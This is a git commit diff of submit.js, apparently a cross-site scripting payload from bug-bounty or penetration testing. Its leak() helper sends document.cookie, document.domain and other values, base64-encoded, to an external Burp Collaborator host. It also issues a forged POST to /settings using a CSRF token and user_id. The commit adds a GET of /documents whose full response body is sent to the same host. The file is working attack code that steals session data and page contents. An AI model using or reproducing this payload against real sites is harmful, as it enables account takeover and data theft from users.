a653be0b5575eeaa08f117c70ab1e13ffb488806
Peter af Geijerstam <peter.af.geijerstam@gmail.com>
2020-01-21 14:46:56 +0100

    Update submit.js

--- submit.js
+++ submit.js
@@ -4,7 +4,7 @@ leak = function(name, data)
    i.src = "https://yxz1eqvtp27ov7r4y4qdkmmyqpwqkf.burpcollaborator.net?" + name + "=" + btoa(data);
    document.body.appendChild(i);	
 }
-leak("window.origin",window.origin);
+
 leak("document.domain",document.domain);
 leak("document.cookie",document.cookie);
 
@@ -17,22 +17,29 @@ FD.append("_csrf_token", csrf);
 FD.append("name", "testing");
 FD.append("user_id", "61");
 
-XHR.addEventListener('load', function( event ) {
-    leak("load_event","Data sent and response loaded.");
-});
-
 XHR.addEventListener('error', function( event ) {
     leak("error_event","Something went wrong.");
 });
 
 XHR.onload = function() {
    if (XHR.status != 200) {
-      leak("onload_non200",`Error ${XHR.status}: ${XHR.statusText}`);
+      leak("onload_post_error",`POST Error ${XHR.status}: ${XHR.statusText}`);
    } else {
-      leak("onload_200",`Done, got ${XHR.response.length} bytes`);
+      leak("onload_post",`POST Done, got ${XHR.response.length} bytes: ${XHR.response}`);
    }
 };
 
-
 XHR.open('POST', '/settings');
 XHR.send(FD);
+
+var XHR2 = new XMLHttpRequest();
+XHR2.open('GET', '/documents');
+XHR2.onload = function() {
+   if (XHR2.status != 200) {
+      leak("onload_get_error",`GET Error ${XHR2.status}: ${XHR2.statusText}`);
+   } else {
+      leak("onload_get",`GET Done, got ${XHR2.response.length} bytes: ${XHR2.response}`);
+   }
+};
+XHR2.send();
+
